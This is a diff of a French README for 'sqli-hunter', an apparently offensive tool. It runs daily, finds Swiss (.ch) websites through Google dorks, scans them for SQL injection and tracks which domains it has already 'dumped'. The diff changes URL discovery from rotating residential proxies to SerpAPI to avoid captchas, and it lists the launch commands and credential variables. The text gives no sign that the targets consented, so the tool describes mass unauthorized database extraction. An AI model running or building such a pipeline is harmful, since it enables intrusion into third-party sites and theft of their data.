@@ -88,7 +88,7 @@ Cron (tous les jours à 3h) :
 ```
 
 Ce que fait le mode daily :
-1. **Discover Google** — dorks `.ch` via proxy BP (`DISCOVER_PROXY`)
+1. **Discover Google** — dorks `.ch` via SerpAPI (ou proxy BP en fallback)
 2. **Curseur daily** — avance dans `results/discover_cursor.json`
 3. **Rotation dorks** — ordre des requêtes changé chaque jour
 4. Ignore domaines déjà dumpés + URLs déjà scannées
@@ -103,11 +103,11 @@ Fichiers d'état :
 
 ## Découverte d'URLs (`discover`)
 
-Collecte via **Google** (proxy résidentiel BP — IP rotative côté fournisseur).
+Collecte via **Google** — [SerpAPI](https://serpapi.com) recommandé (pas de captcha), ou proxy BP en fallback.
 
 ```bash
 # Copier sqli-hunter.env.example → sqli-hunter.env
-# DISCOVER_PROXY=http://user:pass:residential.bpproxy.at:1000
+# SERPAPI_API_KEY=...   (https://serpapi.com/manage-api-key)
 ./sqli-hunter daily
 
 ./sqli-hunter ch --discover-limit 500
@@ -115,11 +115,12 @@ Collecte via **Google** (proxy résidentiel BP — IP rotative côté fournisseu
 
 | `--source` | Moteur |
 |------------|--------|
-| `google` | Google + `DISCOVER_PROXY` [défaut] |
+| `google` | SerpAPI si clé configurée, sinon proxy BP [défaut] |
 | `wayback` | Archive (1 domaine) |
 
 Variables (`sqli-hunter.env` ou env) :
-- `DISCOVER_PROXY` — proxy BP (`http://user:pass:host:port`)
+- `SERPAPI_API_KEY` — clé API SerpAPI [recommandé]
+- `DISCOVER_PROXY` — proxy BP fallback (`http://user:pass:host:port`)
 - `DISCOVER_PROXIES` — liste optionnelle (virgule / ligne)
 
 | Option | Description |
